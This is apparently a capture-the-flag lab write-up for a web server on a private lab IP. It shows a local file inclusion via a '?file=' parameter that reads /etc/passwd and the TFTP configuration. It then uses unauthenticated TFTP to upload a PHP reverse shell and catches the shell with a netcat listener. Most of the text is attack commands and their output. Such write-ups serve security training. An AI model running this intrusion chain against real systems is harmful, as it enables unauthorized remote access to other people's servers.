The IP redirects to a webpage for Titan Gears
http://10.129.69.47/?file=home.php

Changing the ed of the url shows the contents of /etc/passwd
http://10.129.69.47/?file=/etc/passwd
```
┌──(kali㉿kali)-[~]
└─$ curl http://10.129.95.185/?file=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin

```

There's several interesting users to look at.
Can't seem to find flags in mike or root dirs right now.
## tftp file enumeration
```
┌──(kali㉿kali)-[~]
└─$ curl http://10.129.95.185/?file=/etc/default/tftpd-hpa
# /etc/default/tftpd-hpa

TFTP_USERNAME="tftp"
TFTP_DIRECTORY="/var/lib/tftpboot"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="-s -l -c"

```

## uploading and accessing files through tftp
```
┌──(kali㉿kali)-[~]
└─$ echo "hello" > test.txt       
                                                                             
┌──(kali㉿kali)-[~]
└─$ tftp 10.129.95.185 69  
tftp> put test.txt

┌──(kali㉿kali)-[~]
└─$ curl  http://10.129.95.185/?file=/var/lib/tftpboot/test.txt 
hello
```

Time to upload a shell :)

## Reverse shell
```
### Attacker
### Upload the payload, then start a listener
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ tftp 10.129.95.185 69
tftp> put php-reverse-shell.php

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ..

### target - hit the URL
http://10.129.95.185/?file=/var/lib/tftpboot/php-reverse-shell.php

### attacker
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.95.185] 47344
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 03:37:10 up 26 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1559): Inappropriate ioctl for device
bash: no job control in this shell
www-data@included:/$ whoami
whoami
www-data
www-data@included:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@included:/$ 

```
